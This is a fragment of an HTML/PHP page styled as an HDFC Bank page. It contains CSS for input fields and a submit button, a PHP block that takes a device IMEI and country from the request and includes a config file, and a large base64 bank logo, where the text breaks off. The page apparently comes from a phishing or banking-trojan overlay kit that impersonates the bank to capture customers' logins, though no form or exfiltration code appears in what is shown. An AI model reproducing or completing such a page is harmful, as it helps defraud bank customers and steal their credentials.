<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>HDFC Bank</title>

    <style>
        body {
            width: auto;
            color: #000000;
            font-size: small;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: #e3e3e3;
        }

        .box_logo {
            background-color: #e3e3e3;
			padding: 3px;
        }

		.submit-button {
			margin-bottom: 10px;
			color: #fff;
			width: 98%;
			padding: 10px;
			background: #78a7da;
			font-weight: bold;
			margin-right: 10px;
			border: 1px none #036;
			font-size: 16px;
		}

        .input-field {
            width: 98%;
			padding: 10px;
            margin-right: 10px;
            border: 1px solid;
			
        }

        .teaser_box {
            margin-bottom: 10px;
            border-color: #FFFFFF;
            padding: 4px 0
        }

        .ptb {
            padding: 4px 0;
        }

        .content {
            padding: 0;
            background-color: #e3e3e3;
            margin: 0 0 0 10px;
        }

        .fielderror {
            border: 1px solid #f00;
            width: 98%;
			padding: 10px;
            margin-right: 10px;
        }
		
		.dunkelblau {
			float: left;
			font-size: 16px;
		}
		
		#header {
			padding: 5px;
			background: #000;
			text-align: center;
		}
    </style>
</head>

<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>

<body>

<div id="header">
<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAVcAAAB0CAYAAAFGeUGiAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAwppVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6MTNGMjc4MjY5N0M1MTFFNkI1MzlCOTc4NDI5Q0Q5MEEiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6MTNGMjc4MjU5N0M1MTFFNkI1MzlCOTc4NDI5Q0Q5MEEiIHhtcDpDcmVhdG9yVG9vbD0iSWxsdXN0cmF0b3IiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0idXVpZDozOEM2NkM4OEYzMzYxMURCQUVEODg3NzdBN0FGMTdEQyIgc3RSZWY6ZG9jdW1lbnRJRD0idXVpZDozOEM2NkM4N0YzMzYxMURCQUVEODg3NzdBN0FGMTdEQyIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/Pizx2vIAACmvSURBVHjaYvz//z/DUAFMeOT+o+HIgXYsI1rIMgPxHwJ67gGx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